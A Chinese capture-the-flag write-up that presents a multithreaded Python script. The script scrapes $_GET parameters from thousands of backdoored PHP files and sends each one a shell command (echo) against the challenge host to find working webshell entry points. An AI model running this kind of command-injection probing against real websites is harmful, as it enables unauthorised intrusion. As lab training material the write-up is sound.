这题非常有意思，在拿去D盾扫描的时候，发现3002个文件里面，有2999个文件是危险文件

但是在实际测试的时候，发现其实都利用不了，所以我们可以写个脚本来扫描

脚本思路如下

  • 获取src文件夹中的所有文件内容

  • 通过re匹配php文件的参数

  • 一个一个去请求

  • 如果页面内容包含我们的"shell"，说明是可用的利用点

清楚思路后，就开始准备

先导入库，以及定义好路径这些

  1. import os
  2. import re
  3. import requests
  4. import threading
  5. import time

  7. path="D:\软件\脚本\项目文件\CTF题目\高明的黑客\src"
  8. files=os.listdir(path)
  9. url="http://471ea310-a717-48af-93a0-2f2c1ed836ac.node3.buuoj.cn/"

然后写一个匹配的规则为

  1. ...
  2. pattern=r'$_GET[\'(.*?)\']'

然后开始扫描+测试部分

  1. ...
  2. def get_test(filename):
  3.     global url
  4.     sem.acquire()
  5.     filevalue=open("./src/"+filename)
  6.     get_parameter=re.findall(r'\$_GET\[\'(.*?)\'\]',str(filevalue.read()))
  7.     #post_parameter=re.findall(r'\$_POST\[\'(.*?)\'\]',file)
  8.     if get_parameter:
  9.         for i in get_parameter:
  10.             a=requests.get(url=url+filename+"?"+i+"=echo \"elapse\"")
  11.             time.sleep(1)
  12.             if "elapse" in a.text:
  13.                 print("=====*=====")
  14.                 print("[+] "+filename+" OK")
  15.                 print("=====*=====")
  16.     filevalue.close()
  17.     print("[-] "+filename+" Done")
  18.     sem.release()

这里的sem其实是后面多线程会用到的东西

Semaphore是最古老的同步原语之一，由荷兰计算机科学家 Edsger W. Dijkstra 发明。（他最早使用名为P()和V()的函数对应acquire()和release()）。threading模块中，Semaphore在内部管理着一个计数器。调用acquire()会使这个计数器-1，release()则是+1。计数器的值永远不会小于 0，当计数器到0时，再调用acquire()就会阻塞，直到其他线程来调用release()。Semaphore 也支持上下文管理协议。

写完扫描测试的部分后，开始执行多线程就好了

  1. ...
  2. pool=[]
  3. sem=threading.Semaphore(10)

  5. for filename in reversed(files):
  6.     t = threading.Thread(target=get_test,args=(filename,))
  7.     pool.append(t)

  9. with sem:
  10.     for i in pool:
  11.         i.start()

这样就会以10线程开始任务扫描了，当然扫描数过多的时候网站会429，表示太多的请求，所以我在请求的部分，加上了一个time.sleep(1)，给网站缓一下

执行后，等待就好了
